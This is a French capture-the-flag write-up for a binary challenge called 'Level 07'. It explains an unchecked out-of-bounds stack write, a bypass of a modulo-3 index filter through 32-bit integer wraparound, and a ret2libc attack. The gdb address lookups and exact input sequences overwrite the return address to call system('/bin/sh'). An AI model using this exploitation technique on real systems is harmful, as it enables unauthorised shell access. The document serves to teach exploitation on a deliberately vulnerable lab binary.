## Level 07

### Analyse

Le binaire expose une boucle interactive avec deux opérations : `read_number` et `store_number`.
Ces fonctions lisent et écrivent des entiers dans un tableau d'entiers alloué sur la stack.

**Vulnérabilité 1 — Out-of-Bounds Write**
Aucune vérification de l'index fourni par l'utilisateur n'est effectuée.
On peut donc écrire n'importe où sur la stack, y compris sur le return address (`EIP`) de `main`.

**Vulnérabilité 2 — Filtre modulo 3**
Le programme refuse d'écrire si `index % 3 == 0`.
L'index cible (114) est un multiple de 3 → il faut contourner ce filtre.

**Vulnérabilité 3 — Integer Overflow (32-bits)**
Sur une architecture 32-bits, les adresses bouclent tous les `2^32 = 4 294 967 296` octets.
En ajoutant un tour complet divisé par 4 à l'index bloqué, on obtient un index différent qui pointe physiquement au même endroit :

```
114 + (4 294 967 296 / 4) = 1 073 741 938
1 073 741 938 % 3 = 2  ✓ (filtre contourné)
1 073 741 938 * 4 = overflow → retombe sur l'offset 456
```

---

### Calcul des offsets

```
EIP = return address de main
Distance EIP - début tableau = 456 octets

Index EIP  = 456 / 4 = 114        ← bloqué (114 % 3 == 0)
Index réel = 114 + 2^32 / 4 = 1 073 741 938  ← autorisé

Index EIP + 1 = 115  →  adresse de retour pour system() (inutile ici)
Index EIP + 2 = 116  →  argument de system() = adresse de "/bin/sh"
```

---

### Trouver les adresses

```bash
gdb ./level07
break main
run

# Adresse de system()
p system
# → $1 = 0xf7e6aed0  =  4 159 090 384

# Adresse de "/bin/sh"
find &system, +9999999, "/bin/sh"
# → 0xf7f897ec  =  4 160 264 172
```

---

### Valeurs

| Élément           | Adresse hex    | Valeur décimale   |
|-------------------|----------------|-------------------|
| `system()`        | `0xf7e6aed0`   | `4 159 090 384`   |
| `"/bin/sh"`       | `0xf7f897ec`   | `4 160 264 172`   |
| Index EIP (réel)  | —              | `1 073 741 938`   |
| Index `/bin/sh`   | —              | `116`             |

---

### Exploitation

```bash
# Écraser EIP avec l'adresse de system()
Input command: store
Number: 4159090384
Index: 1073741938

# Placer "/bin/sh" comme argument de system() (EIP + 2)
Input command: store
Number: 4160264172
Index: 116

# Déclencher le return → system("/bin/sh")
Input command: quit
```